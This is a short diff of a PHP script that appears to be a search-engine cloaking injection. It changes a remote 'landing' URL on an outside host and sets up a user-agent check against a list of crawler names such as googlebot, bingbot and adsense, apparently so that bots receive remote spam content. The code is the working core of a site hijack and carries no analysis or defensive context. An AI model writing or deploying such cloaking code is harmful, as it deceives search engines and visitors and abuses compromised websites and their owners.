@@ -2,7 +2,7 @@
 ob_start();
 header('Vary: Accept-Language, User-Agent');
 
-$bot_url = "https://rakun.live/landing/edubt.txt"; #url landing
+$bot_url = "https://rakun.live/landing/edubt.html"; #url landing
 $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
 
 $bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];
